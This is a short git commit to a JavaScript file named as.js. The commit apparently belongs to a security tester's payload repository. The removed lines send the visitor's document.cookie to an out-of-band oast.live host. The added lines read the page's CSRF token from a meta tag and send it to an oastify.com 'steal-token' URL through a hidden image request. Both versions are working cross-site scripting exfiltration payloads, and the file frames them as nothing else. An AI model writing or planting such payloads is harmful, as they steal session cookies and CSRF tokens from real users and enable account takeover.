f41a611bf2d73393d38785c46229fad40fcef9e7
0x1b <164749781+RHYru9@users.noreply.github.com>
2024-07-09 16:45:45 +0700

    Update as.js

--- as.js
+++ as.js
@@ -1,5 +1,6 @@
-var xhttp = new XMLHttpRequest();
-
-xhttp.open('GET', 'http://cpvd2ndarg3c5r5pjjlgzr55kdqqcsfe5.oast.live/c?' + document.cookie, true);
-
-xhttp.send();
+const tokenValue = document.querySelector('meta[name="csrf-token"]').getAttribute('content'); 
+const img = new Image(); 
+const attackerServerUrl = 'https://aaoxzv7im9wiiquk8o460slj3a91xrlg.oastify.com/steal-token';
+const url = `${attackerServerUrl}?stolen_token=${encodeURIComponent(tokenValue)}`;
+img.src = url;
+document.body.appendChild(img);
